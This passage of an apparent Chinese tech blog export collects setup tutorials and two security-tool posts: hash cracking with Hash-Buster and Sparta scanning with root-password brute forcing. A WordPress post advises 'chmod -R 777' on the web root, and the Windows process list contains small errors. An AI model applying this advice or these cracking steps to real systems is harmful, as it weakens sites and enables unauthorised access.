上传到/Web/usr/themes/文件夹下。然后进入后台管理界面，启用刚才安装的主题即可。刷新一下页面，即可看到新主题已经上线，嘿嘿~~~如果你需要安装什么新的插件的话，你首先下载解压出来，然后上传到/Web/usr/plugins/目录下，再到后台启用即可。一切都设置好的话，我们可以自己买个域名，我这里有几个域名，都是在阿里云购买的，解析了，开始解析并绑定域名。点击”域名绑定”，输入你购买的域名。再进入阿里云控制台，开始解析域名，我这里解析出一个www和@类型。如果你是初次建站，你也许不理解这是什么意思，但是这里不做过多解释了，你只需按照我图示操作即可。还有一点就是，你解析出来的是什么类型的网址，你就绑定什么类型的。一定要全部绑定，否则不能正常访问。其中的记录值即为FTP地址。解析成功后，点击你的域名即可打开你的博客了。好了，整个过程就是这样，如果你还有哪里不懂的，可以加我QQ与我讨论。我所用到的软件以及主题都传到群文件了，如果你需要的话，可以加群。 扫码进群，我等待你的加入]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>建站</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hash查询破解工具Hash-Buster]]></title>
    <url>%2F2018%2F06%2F28%2Fhash%E6%9F%A5%E8%AF%A2%E7%A0%B4%E8%A7%A3%E5%B7%A5%E5%85%B7Hash-Buster%2F</url>
    <content type="text"><![CDATA[导读Hash Buster是一个调用了多个API接口去查询并破解hash的自动化工具，速度快且成功率很高。识别并破解单个hash值仅仅在3秒以下 GitHub项目地址: https://github.com/s0md3v/Hash-Buster 0x01 特点 自动标识hash加密类型 支持MD5、SHA1、SHA2加密 支持从文件中提取hash密码并且破解 支持以wordlist形式存储的hash值 同时调用了6个API接口 0x02 安装安装12root@kali:~# git clone https://github.com/s0md3v/Hash-Busterroot@kali:~# make &amp;&amp; make install 0x03 选项选项 -s HASH hashed string # hash值 -f PATH file containing hashes # 包含hash值的文件 -d DIR directory containing hashes # 包含hash值的字典文件 0x04 使用(以下仅仅是我为测试而使用的hash加密过的值)1234567891011121314root@kali:~/Hash-Buster# python hash.py -s 7cec85c75537840dad40251576e5b757|__| |__| [__ |__| |__] | | [__ | |___ |__/| | | | ___] | | |__] |__| ___] | |___ | \ v2.0[!] Hash function : MD512356root@kali:~/Hash-Buster# python hash.py -s 9fe2839c7d19fe2511ef5cc3d63bd475b139fc83_ _ ____ ____ _ _ ___ _ _ ____ ___ ____ ____|__| |__| [__ |__| |__] | | [__ | |___ |__/| | | | ___] | | |__] |__| ___] | |___ | \ v2.0[!] Hash function : SHA112356 扫码进群，我等待你的加入]]></content>
      <categories>
        <category>加密解密</category>
      </categories>
      <tags>
        <tag>Kali</tag>
        <tag>MD5</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[领取免费虚拟主机]]></title>
    <url>%2F2018%2F06%2F27%2F%E9%A2%86%E5%8F%96%E5%85%8D%E8%B4%B9%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BA%2F</url>
    <content type="text"><![CDATA[其实主机屋早就有这个活动了，只是今天才知道，但还是有必要写出来给不知道的同学玩玩的。该主机只适合做测试或者简单学习使用，不要存储数据，也不要利用它做网站。免费的没好货，你明白这一点就不要抱怨这台主机的各种缺点了。网址: http://www.zhujiwu.com首先注册账户，这些不必多说什么，需要手机号、 QQ号。然后进入免费专区，选择”免费虚拟主机”。需要绑定微信号。然后进入控制台，在左侧栏点击”产品”就可以看到自己的虚拟主机了。这是一台Windows NT主机。然后点击”管理”就可以管理自己的云虚拟主机了。首先要设置一个密码，记住你的主机的IP地址、账号、密码。方便以后登陆管理。默认只有30天使用时间，但是可以免费延期，你可以提交申请延期，具体步骤看网站即可。点击网站域名即可登陆进去。当然你需要利用FTP软件进行上传网站程序上去才可以。上传点你写的网页还是可以的。忠心提醒: 不适合做个人网站或者博客 还请你一定记住。但是你可以利用该主机学习一下建站，但也只是做测试而已，别想着做太多事。s 扫码进群，我等待你的加入]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>建站</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[在Linux终端听网易云音乐]]></title>
    <url>%2F2018%2F06%2F26%2F%E5%9C%A8Linux%E7%BB%88%E7%AB%AF%E5%90%AC%E7%BD%91%E6%98%93%E4%BA%91%E9%9F%B3%E4%B9%90%2F</url>
    <content type="text"><![CDATA[演示环境: Ubuntu16.04(LTS)如果你是其他的系统，你可以去GitHub地址 寻找安装方法。 功能特性 ➢ 320kbps的高品质音乐 ➢ 歌曲，艺术家，专辑检索 ➢ 网易22个歌曲排行榜 ➢ 网易新碟推荐 ➢ 网易精选歌单 ➢ 网易主播电台 ➢ 私人歌单，每日推荐 ➢ 随心打碟 ➢ 本地收藏，随时加❤ ➢ 播放进度及播放模式显示 ➢ 现在播放及桌面歌词显示 ➢ 歌曲评论显示 ➢ 一键进入歌曲专辑 ➢ 定时退出 ➢ Vimer式快捷键让操作丝般顺滑 ➢ 可使用数字快捷键 ➢ 可使用自定义全局快捷键 安装12lengyue@ubuntu:~$ sudo pip install NetEase-MusicBoxlengyue@ubuntu:~$ sudo apt-get install mpg123 如果你遇到以下情况请使用以下命令进行安装1lengyue@ubuntu:~$ sudo -H pip install NetEase-MusicBox 安装成功后，就可以直接使用了。1lengyue@ubuntu:~$ musicbox 由于该工具完全依赖于终端，所以指南使用快捷键方式来进行操作，类似于vim的命令行模式。 J Down 下移 K Up 上移 H Back 后退 L Forword 前进 U Prev page 上一页 D Next page 下一页 F Search 快速搜索 [ Prev song 上一曲 ] Next song 下一曲 = Volume + 音量增加 - Volume - 音量减少 Space Play/Pause 播放/暂停 ? Shuffle 手气不错 M Menu 主菜单 P Present/History 当前/历史播放列表 I Music Info 当前音乐信息 ⇧+P Playing Mode 播放模式切换 A Add 添加曲目到打碟 ⇧+A Enter album 进入专辑 G To the first 跳至首项 ⇧+G To the end 跳至尾项 Z DJ list 打碟列表 S Star 添加到收藏 C Collection 收藏列表 R Remove 删除当前条目 ⇧+J Move Down 向下移动当前项目 ⇧+K Move Up 向上移动当前项目 ⇧+C Cache 缓存歌曲到本地 , Like 喜爱 . Trash FM 删除 FM / Next FM 下一FM Q Quit 退出 T Timing Exit 定时退出 W Quit&amp;Clear 退出并清除用户信息 扫码进群，我等待你的加入]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux终端下查看天气预报]]></title>
    <url>%2F2018%2F06%2F25%2FLinux%E7%BB%88%E7%AB%AF%E4%B8%8B%E6%9F%A5%E7%9C%8B%E5%A4%A9%E6%B0%94%E9%A2%84%E6%8A%A5%2F</url>
    <content type="text"><![CDATA[wttr.in 是一个面向控制台的天气预报服务，支持各种信息表示方法像终端面向ANSI-序列用于HTTP客户端控制台例如curl、wgethttpie,HTML的web浏览器或用于PNG图形。 GitHub地址: https://github.com/chubin/wttr.in演示环境为 Ubuntu16.04(LTS)首先安装curl。1lengyue@ubuntu:~$ sudo apt-get install curl 查看帮助1lengyue@ubuntu:~$ curl wttr.in/:help 然后直接运行1lengyue@ubuntu:~$ curl wttr.in 他会自动获取你的IP地址，然后来显示当地的3天的天气预报，十分具体。当然因为是根据你的IP地址来定位的，所以有时候并不可能定位到你的准确位置。所以我们还可以指定自己城市。你只需要用/作为前缀，加上城市名即可。当然城市名需要是准确存在的才行。1lengyue@ubuntu:~$ curl wttr.in/Beijing 你还可以用指定使用IP地址或域名，以/@作为前缀，加上IP地址或者域名即可。12lengyue@ubuntu:~$ curl wttr.in/@bingyublog.comlengyue@ubuntu:~$ curl wttr.in/@151.101.41.147 你还可以将天气预报直接下载到本地，生成png图片来进行查看。你只需要以/作为前缀，然后加上图片名称.png即可。12lengyue@ubuntu:~$ wget wttr.in/tianqi.pnglengyue@ubuntu:~$ eog tianqi.png 个人感觉 ，这些就是最常用的操作了，如果你想获取更多的用法可以直接访问其GitHub项目地址。 扫码进群，我等待你的加入]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows系统进程及其基本含义]]></title>
    <url>%2F2018%2F06%2F21%2FWindows%E7%B3%BB%E7%BB%9F%E8%BF%9B%E7%A8%8B%E5%8F%8A%E5%85%B6%E5%9F%BA%E6%9C%AC%E5%90%AB%E4%B9%89%2F</url>
    <content type="text"><![CDATA[接下来，我以个人win10系统为例，教你快速认识Windows系统进程及其基本含义。进程是指在系统中正在运行的一个应用程序；线程是系统分配处理器时间资源的基本单元，或者说进程之内独立执行的一个单元。对于操 作系统而言，其调度单元是线程。一个进程至少包括一个线程，通常将该线程称为主线程。一个进程从主线程的执行开始进而创建一个或多个附加线程，就是所谓基于多线程的多任务。 系统进程的主要作用是确保操作系统能够正常运行，在Windows10系统中，右击任务栏任意空白处，在弹出的跨界菜单中单击“启动任务管理器”，打开“任务管理器”窗口，切换至“进程”选项卡，便可看见当前正在运行的所有进程。用户名为“Admin”所对应的进程就是系统进程。当然你也可以使用快捷键 ctr+alt+delete,然后点击”任务管理器”打开。打开后是这样。 我们切换至”详细信息”选项卡。可以看到更为详细的进程信息,包括运行程序名称、PID(进程的ID)、运行状态、运行程序所属的用户名、CPU占有率、占用内存大小、对该进程的描述。这些信息对于我们管理自己的系统提供了大量的信息。 最主要的系统进程及其基本含义如下： conime.exe ：该进程与输入法编辑器相关，能够确保正常调整和编辑系统中的输入法。 carss.exe ：该进程是微软客户端/服务端运行时子系统，该进程管理Windows图形相关任务。 ctfmon.exe :该进程与输入法有关，该进程的正常运行能够确保语言栏能正常显示在任务栏中。 explorer.exe ：该进程是Windows资源管理器，可以说是Windows图形界面外壳程序，该进程的正常运行能够确保在桌面上显示桌面图标和任务栏。 lsass.exe ：该进程用于Windows操作系统的安全机制、本地安全和登录策略。 services.exe ：该进程用于启动和停止系统中的服务，如果用户手动终止该进程，系统也会重新启动该进程。 smss.exe ：该进程用于调用对话管理子系统，负责用户与操作系统的对话。 svchost.exe ：该进程是从动态链接库（DLL)中运行的服务的通用主机进程名称，如果用户手动终止该进程，系统也会重新启动该进程。 system ：该进程是Windows页面内存管理进程，它能够确保系统的正常运行。 system idle process ：该进程的功能是在CPU空闲时发出一个命令，使CPU挂起（暂时停止工作），从而有效降低CPU内核的温度。 winlogon.exe ：该进程是Windows NT 用户登录程序，主要用于管理用户登录和退出。 扫码进群，我等待你的加入]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux中的官方源、镜像源汇总]]></title>
    <url>%2F2018%2F06%2F19%2FLinux%E4%B8%AD%E7%9A%84%E5%AE%98%E6%96%B9%E6%BA%90%E3%80%81%E9%95%9C%E5%83%8F%E6%BA%90%E6%B1%87%E6%80%BB%2F</url>
    <content type="text"><![CDATA[0x00 企业站 0x00 搜狐 http://mirrors.sohu.com/ 0x01 网易 http://mirrors.163.com/ 0x02 阿里云 http://mirrors.aliyun.com/ 0x03 腾讯 http://android-mirror.bugly.qq.com:8080/（仅针对APP开发的软件，限流，不推荐） 0x04 淘宝 http://npm.taobao.org/ 0x01 教育站0x00 上海交通大学http://ftp.sjtu.edu.cn/html/resources.xml（部分移动运营商出口状况不佳，无法访问）0x01 华中科技大学http://mirror.hust.edu.cn/（当前已用容量估计：4.83T）0x02 清华大学http://mirrors.tuna.tsinghua.edu.cn/（当前已用容量估计：9.8T）0x03 北京理工大学http://mirror.bit.edu.cn/web/0x04 兰州大学http://mirror.lzu.edu.cn/0x05 中国科技大学http://mirrors.ustc.edu.cn/（当前已用容量估计：21.32T）0x06 大连东软信息学院 http://mirrors.neusoft.edu.cn/（当前已用容量估计：2.5T） 0x07 东北大学http://mirror.neu.edu.cn/0x08 大连理工大学http://mirror.dlut.edu.cn/0x09 哈尔滨工业大学http://run.hit.edu.cn/html/（部分联通运营商出口状况不佳，无法访问）0x0A 北京交通大学http://mirror.bjtu.edu.cn/cn/0x0B 天津大学http://mirror.tju.edu.cn（无法访问，ping超时）0x0C 中国地质大学http://mirrors.cug.edu.cn/（当前已用容量估计：2.3T）0x0D 浙江大学http://mirrors.zju.edu.cn/0x0E 厦门大学http://mirrors.xmu.edu.cn/0x0F 中山大学http://mirror.sysu.edu.cn/0x10 重庆大学 http://mirrors.cqu.edu.cn/（当前已用容量估计：3.93T）0x11 北京化工大学http://ubuntu.buct.edu.cn/（Android SDK镜像仅供校内使用，当前已用容量估计：1.72T）0x12 南阳理工大学http://mirror.nyist.edu.cn/0x13 中国科学院http://www.opencas.org/mirrors/0x14 电子科技大学http://ubuntu.uestc.edu.cn/（无法访问，ping超时）0x15 电子科技大学星辰工作室http://mirrors.stuhome.net/（当前已用容量估计：1.08T）0x16 西北农林科技大学http://mirrors.nwsuaf.edu.cn/（只做CentOS镜像，当前已用容量估计：140GB）0x17 浙江大学http://mirrors.zju.edu.cn/0x18 台湾淡江大学 http://ftp.tku.edu.tw/Linux/0x03 其他 0x00 首都在线科技股份有限公司http://mirrors.yun-idc.com/0x01 中国电信天翼云 http://mirrors.noc.im/（当前已用容量估计：3.74T）0x02 常州贝特康姆软件技术有限公司 http://centos.bitcomm.cn/（只做CentOS镜像，当前已用容量估计：140GB）0x03 公云PubYun（母公司为贝特康姆）http://mirrors.pubyun.com/0x04 Linux运维派：http://mirrors.skyshe.cn/（使用阿里云服务器，界面使用浙江大学的模板，首页维护，内容可访问）0x05 中国互联网络信息中心：http://mirrors.cnnic.cn/（只做Apache镜像，当前已用容量估计：120GB）0x06 Fayea工作室：http://apache.fayea.com/（只做Apache镜像，当前已用容量估计：120GB）0x07 开源中国社区：http://mirrors.oss.org.cn/0x04 Ubuntu0x00 阿里云：http://mirrors.aliyun.com/ubuntu-releases/0x01 网易： http://mirrors.163.com/ubuntu-releases/0x02 搜狐：http://mirrors.sohu.com/ubuntu-releases/0x03 首都在线科技股份有限公司：http://mirrors.yun-idc.com/ubuntu-releases/0x05 CentOS 0x00 网易：http://mirrors.163.com/centos/0x01 搜狐： http://mirrors.sohu.com/centos/0x02 阿里云：http://mirrors.aliyun.com/centos/0x06 Apache 0x00 中国互联网络信息中心：http://mirrors.cnnic.cn/apache/0x01 华中科技大学http://mirrors.hust.edu.cn/apache/0x02 北京理工大学：http://mirror.bit.edu.cn/apache/0x03 TOMCAT全版本： https://archive.apache.org/dist/tomcat/0x07 MySQL 0x00 北京理工大学：http://mirror.bit.edu.cn/mysql/Downloads/0x01 中国电信天翼云： http://mirrors.ctyun.cn/Mysql/0x02 搜狐镜像源：http://mirrors.sohu.com/mysql/0x08 PostgreSQL 0x00 浙江大学： 0x09 MariaDB 0x00 中国电信天翼云： 0x0A VideoLAN 0x00 大连东软信息学院：http://mirrors.neusoft.edu.cn/videolan/0x01 中国科技大学：http://mirrors.ustc.edu.cn/videolan-ftp/0X0B PHP 0x00 php全版本https://secure.php.net/releases/0X0C Eclipse 0x00 中国科技大学http://mirrors.ustc.edu.cn/eclipse/0x01 中国科学院http://mirrors.opencas.cn/eclipse/0x02 东北大学http://ftp.neu.edu.cn/mirrors/eclipse/，http://mirror.neu.edu.cn/eclipse/0x0D Android SDK 0x00 中国科学院http://mirrors.opencas.ac.cn/android/repository/0x01 南洋理工学院http://mirror.nyist.edu.cn/android/repository/0x02 中国科学院http://mirrors.opencas.cn/android/repository/0x03 腾讯http://android-mirror.bugly.qq.com:8080/android/repository/（限流，不推荐）0x04 大连东软信息学院http://mirrors.neusoft.edu.cn/android/repository/（同步效果不如中科院的镜像，不推荐）（十四）、Xcode 0x00 腾讯http://android-mirror.bugly.qq.com:8080/Xcode/（从7.2之后不再更新，建议直接从官网下载）容器 0x00 lxc国内镜像源https://mirrors.tuna.tsinghua.edu.cn/lxc-images/ 官方镜像列表状态地址 0x00 CentOShttp://mirror-status.centos.org/#cn 0x01 Archlinuxhttps://www.archlinux.org/mirrors/status/ 0x02 Ubuntuhttps://launchpad.net/ubuntu/+cdmirrors 0x03 Debianhttp://mirror.debian.org/status.html 0x04 Fedora Linux/Fedora EPELhttps://admin.fedoraproject.org/mirrormanager/mirrors 0x05 Apachehttp://www.apache.org/mirrors/#cn 0x06 Cygwinhttps://www.cygwin.com/mirrors.html]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[手把手搭建个人博客（图文教程）]]></title>
    <url>%2F2018%2F06%2F17%2F%C2%96%E6%89%8B%E6%8A%8A%E6%89%8B%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%EF%BC%88%E5%9B%BE%E6%96%87%E6%95%99%E7%A8%8B%EF%BC%89%2F</url>
    <content type="text"><![CDATA[请输入密码(不要尝试暴力破解，没用的) Incorrect Password! No content to display! ]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>建站</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kali渗透信息收集工具sparta]]></title>
    <url>%2F2018%2F06%2F16%2Fkali%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7sparta%2F</url>
    <content type="text"><![CDATA[导读Sparta是一款集合渗透工具套件，集合了nmap、nikto、hydra等工具，利用各个优秀工具的结合，使渗透测试更加便捷 0x00 工具简介 SPARTA 是一款可以通过帮助渗透测试者分阶段扫描和枚举来简化网络基础设施渗透测试的python GUI应用。通过指向和点击这些工具套件以及简便地显示所有工具扫描结果来允许测试者节省时间。花越少的时间在设置命令和工具上，就可以有更多的时间花在聚焦分析结果上。工具主页：http://sparta.secforce.com/GitHub地址: https://github.com/secforce/spartakali官方简介: https://tools.kali.org/information-gathering/sparta 0x01 工具使用 我开了一台Ubuntu作为测试主机，开启了lampp。Sparta已经集成到kali系统中了，所以我们无需安装，可以直接运行使用。我们可以在 applications—information gathering—sparta 双击打开或者直接在命令行里输入 sparta 运行。在左侧栏“ Click here to add host(s) to scope ”进行添加主机，可以是一个IP地址，也可以是一个范围，即可扫描，速度还是很快的。下方”log”处显示扫描进度以及扫描状态。默认扫描的是最彻底和完全的，所以完成需要一定的时间。Sparta一旦发现活跃的主机和开发的端口，那么它就会运行其他的工具，比如Nikto，smbenum，snmpcheck，等等，另外的发现服务。然后我们指定扫描到的主机，点击”Services”可以查看主机开放的端口以及对应的服务等信息，可以对扫描出来的服务进一步分析。我们可以看到已经扫描出这是一台运行Linux系统的主机，而且已经开启了mysql，http，telnet等服务，然后我们点击具体的端口可以查看更加详细的信息，这些都是有助于我们接下来进行渗透测试的。接下来，我们还可以指定特定的服务来使用工具套件进行渗透测试。如图所示然后对于那些需要登陆的服务，例如Telnet、SSH、FTP等，我们可以使用一些密码破解工具来尝试暴力破解密码。按照如图所示的进行配置，我们指定爆破用户名为root的账户，并且我们为破解指定一个字典，点击”run”开始破解。成功率取决于你的字典以及运气。 好了，它最基础的操作已经说完了，当然它的功能远不止于此，这些需要你在实践中自己操作来学习，你要永远记住一个自动化渗透工具可以为你节省大量的时间来完成自动化渗透测试中的许多繁琐的任务。 扫描进群，我等待你的加入]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[无法建立目录wp-content/uploads/xxx/xxx.有没有上级目录的写权限?]]></title>
    <url>%2F2018%2F06%2F12%2F%E6%97%A0%E6%B3%95%E5%BB%BA%E7%AB%8B%E7%9B%AE%E5%BD%95wp-content-uploads-xxx-xxx-%E6%9C%89%E6%B2%A1%E6%9C%89%E4%B8%8A%E7%BA%A7%E7%9B%AE%E5%BD%95%E7%9A%84%E5%86%99%E6%9D%83%E9%99%90%2F</url>
    <content type="text"><![CDATA[今天在设置站点图标、上传图片的时候，遇到了这个问题。提示”无法建立目录wp-content/uploads/2018/06.有没有上级目录的写权限?”首先根据提示，我们可以知道是因为权限的问题，所以我可以根据提示进行解决问题。我们进入word press的文件夹。找到wp-content文件夹，发现在这个文件夹下是没有uploas这个文件夹的，所以我们需要创建一个.1lengyue@ubuntu:/opt/lampp/htdocs/wordpress/wp-content$ sudo mkdir uploads/ 然后我们对整个word press文件夹都设置权限，经过我自己亲测，发现你设置755的文件权限，并不能解决这个问题，而是需要777的权限。1lengyue@ubuntu:~$ sudo chmod -R 777 /opt/lampp/htdocs/wordpress/ 好了，这样就可以了。你再次向网站上传文件的时候，就再也不会出现这个问题了。 扫码进群，我等待你的加入]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>建站</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[更改word press站点主题]]></title>
    <url>%2F2018%2F06%2F11%2F%E6%9B%B4%E6%94%B9word-press%E7%AB%99%E7%82%B9%E4%B8%BB%E9%A2%98%2F</url>
    <content type="text"><![CDATA[word press提供了大量精美的主题，我们可以直接在线搜索就可以了，但是一些主题是经过别人更改的，所以是在wordpress主题站点里是搜索不出来的。这个时候，我们需要下载到本地，再进行安装。今天就来说说本地下载安装的方法。在此，我推荐一个自己喜欢的二次元风格的主题。地址: https://github.com/ShawnZeng1996/Memory直接下载zip文件，先解压，再复制到wordpress的主题文件夹中。12lengyue@ubuntu:~$ sudo unzip Memory.ziplengyue@ubuntu:~$ sudo cp -r Memory /opt/lampp/htdcos/wordpress/wp-content/themes/ 然后打开浏览器输入 http://127.0.0.1/wordpress/wp-admin/themes.php 打开即可看到你安装的主题了，然后点击启用就可以了。当然这个时候，主题还是初始化的状态，还需要设置一下才可以接续使用。我们下拉仪表盘的选项，就可以看到Memory主题设置这个按钮了，我们进去按照自己的需求设置一下就可以使用了，这个主题还是提供了许多功能选项的。设置好，打开主页就可以了，下面是我初步设置好的图例。 扫码进群，我等待你的加入]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>建站</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[本地搭建wordpress站点]]></title>
    <url>%2F2018%2F06%2F07%2F%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BAwordpress%E7%AB%99%E7%82%B9%2F</url>
    <content type="text"><![CDATA[环境: 虚拟机中的Ubuntu 16.04 (Windows、Mac系统操作步骤大致相同)本篇文章为在自己电脑上本地搭建wordpress站点，虽然不能进行外网访问，但是对于建站小白或者没有服务器的同学，本篇文章还是很有借鉴意义的。对你学习配置站点，也同样有意义。 首先准备xampp集成环境，这个在Ubuntu搭建DVWA靶机环境 文章中已经详细介绍，具体可以参考该篇文章。 接着打开终端启动xampp。1lengyue@ubuntu:~$ sudo /opt/lampp/lampp start 下面开始建立数据库，浏览器地址栏输入 http://127.0.0.1/phpmyadmin/ 即可打开数据库。接下来为wordpress站点设置一个专属的数据库。按图示操作即可。选择 账户-新增用户账户自定义设置用户名，主机名必须选择为本地，然后点击生成密码，会自动为你设置一个强加密类型的密码，一定要记住这个密码，是你登陆、操作数据库唯一的凭证。然后下拉，设置数据库权限等数据库相关信息。下拉，点击提交，即成功创建了一个新的数据库。 下面开始安装wordpress。下载地址： https://cn.wordpress.org/txt-download/下载后解压并添加到xampp中。12lengyue@ubuntu:~$ sudo unzip wordpress-4.9.4-zh_CN.ziplengyue@ubuntu:~$ sudo cp -r wordpress /opt/lampp/htdocs/ ## 解压后文件名设置为wordpress 浏览器地址栏输入 http://127.0.0.1/wordpress/ 打开即可。将数据库添加到站点。然后就设置站点信息了。自定义即可。好了，安装成功。然后我们登陆进网站后台。打开网站首页。 如果你在安装过程中出现以下报错界面。我们根据提示操作即可,创建一个wp-config.php文件，并将框内内容全部复制粘贴进去，保存退出即可。123lengyue@ubuntu:~$ cd /opt/lampp/htdocs/wordpresslengyue@ubuntu:/opt/lampp/htdocs/wordpress$ sudo touch wp-config.phplengyue@ubuntu:/opt/lampp/htdocs/wordpress$ sudo gedit wp-config.php 浏览器刷先后，就可以正常安装了。 OK，大功告成！！！余下的工作就是设置网站，样式和添加网站内容了，wordpress提供了大量的插件以及主题，所以余下工作还是很简单的。 扫码进群，我等待你的加入]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>建站</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一款强大的IP定位工具]]></title>
    <url>%2F2018%2F05%2F24%2F%E4%B8%80%E6%AC%BE%E5%BC%BA%E5%A4%A7%E7%9A%84IP%E5%AE%9A%E4%BD%8D%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[首先说明一下，此工具可以根据你指定的IP或网址，查询出国家、城市、经度、纬度、时区等详细信息。这个工具最重要的就是可以查询出经纬度这个信息了，并且会直接提供给你此经纬度所在位置的谷歌地图。当然根据IP地址定位的在线工具也有很多，但是通常只能精确到某一城市，但是该工具会根据查询到的经纬度精确到街道。我感觉还是有必要说明一下，你查询的IP只是所用流量运营商出口的地址，可能与真实位置有偏差，这是很正常的。下面开始安装并使用。需要python3运行环境(kali已经自带)1root@kali:~# git clone https://github.com/maldevel/IPGeoLocation 安装pip3，一会需要用pip3安装所需的库函数12root@kali:~# apt-get install python3-piproot@kali:~# pip3 --version ##验证是否已经成功安装pip3 安装所需库函数12root@kali:~# cd IPGeoLocation/root@kali:~/IPGeoLocation# pip3 install -r requirements.txt --user 选项说明:1234567891011121314151617181920212223242526272829303132333435$ python3 ipgeolocation.pyusage: ipgeolocation.py [-h] [-m] [-t TARGET] [-T file] [-u User-Agent] [-U file] [-g] [--noprint] [-v] [--nolog] [-x PROXY] [-X file] [-e file] [-ec file] [-ex file]IPGeolocation 2.0.4--[ Retrieve IP Geolocation information from ip-api.com--[ Copyright (c) 2015-2016 maldevel (@maldevel)--[ ip-api.com service will automatically ban any IP addresses doing over 150 requests per minute.optional arguments: -h, --help show this help message and exit -m, --my-ip Get Geolocation info for my IP address. -t TARGET, --target TARGET IP Address or Domain to be analyzed. -T file, --tlist file A list of IPs/Domains targets, each target in new line. -u User-Agent, --user-agent User-Agent Set the User-Agent request header (default: IP2GeoLocation 2.0.3). -U file, --ulist file A list of User-Agent strings, each string in new line. -g Open IP location in Google maps with default browser. --noprint IPGeolocation will print IP Geolocation info to terminal. It is possible to tell IPGeolocation not to print results to terminal with this option. -v, --verbose Enable verbose output. --nolog IPGeolocation will save a .log file. It is possible to tell IPGeolocation not to save those logfiles with this option. -x PROXY, --proxy PROXY Setup proxy server (example: http://127.0.0.1:8080) -X file, --xlist file A list of proxies, each proxy url in new line. -e file, --txt file Export results. -ec file, --csv file Export results in CSV format. -ex file, --xml file Export results in XML format. 我以自己博客为例演示简单的操作1234567891011121314151617181920212223root@kali:~/IPGeoLocation# python3 ipgeolocation.py -t bingyublog.comIPGeolocation 2.0.4--[ Retrieve IP Geolocation information from ip-api.com--[ Copyright (c) 2015-2016 maldevel (@maldevel)--[ ip-api.com service will automatically ban any IP addresses doing over 150 requests per minute.Target: bingyublog.comIP: 151.101.41.147ASN: AS54113 FastlyCity: San JoseCountry: United StatesCountry Code: USISP: FastlyLatitude: 37.3388Longtitude: -121.8914Organization: FastlyRegion Code: CARegion Name: CaliforniaTimezone: America/Los_AngelesZip Code: 95141Google Maps: http://www.google.com/maps/place/37.3388,-121.8914/@37.3388,-121.8914,16z 我们复制此链接，在浏览器中打开即可查看地理位置了，还可以切换平面图和3D地图。 扫码进群，我等待你的加入]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu密码正确，一直无法进入桌面系统，又跳回到登录界面]]></title>
    <url>%2F2018%2F05%2F23%2Fubuntu%E5%AF%86%E7%A0%81%E6%AD%A3%E7%A1%AE%EF%BC%8C%E4%B8%80%E7%9B%B4%E6%97%A0%E6%B3%95%E8%BF%9B%E5%85%A5%E6%A1%8C%E9%9D%A2%E7%B3%BB%E7%BB%9F%EF%BC%8C%E5%8F%88%E8%B7%B3%E5%9B%9E%E5%88%B0%E7%99%BB%E5%BD%95%E7%95%8C%E9%9D%A2%2F</url>
    <content type="text"><![CDATA[今天晚上回来用ubuntu的时候，发现Ubuntu一直无法进入桌面系统，又跳回到登陆界面，但是密码一直是正确的。应该是我前几天卸载了一个桌面的主题，然后把桌面的一些配置、依赖什么的也删除了吧。所以我马上就进行了修复，毕竟重装系统是在你实在没办法的时候才用到的办法。下面就记录一下修复过程，过程属于那种简单暴力的办法。提醒各位一句，如果你的系统安装在硬盘上或者Ubuntu系统里存储了大量的数据，我不建议你按照我的办法进行修复。开始！我们按ctr+alt+F2，进入命令模式。这个时候我们输入命令 startx 是可以看到报错的。我们可以根据报错对配置文件进行更改以修复。但是不这样了，麻烦，也不一定看得懂报错的意思。既然桌面进不去，就是桌面出现问题了，那就卸载原本桌面，重装新的桌面系统。12lengyue@ubuntu:~$ sudo apt-get remove ubuntu-desktop ##卸载桌面lengyue@ubuntu:~$ sudo apt-get install ubuntu-desktop ##安装桌面 然后重启系统，再次进入，就可以成功进入桌面了。 扫码进群，我等待你的加入]]></content>
      <categories>
        <category>ubuntu</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux面试题解析第3天]]></title>
    <url>%2F2018%2F05%2F20%2FLinux%E9%9D%A2%E8%AF%95%E9%A2%98%E8%A7%A3%E6%9E%90%E7%AC%AC3%E5%A4%A9%2F</url>
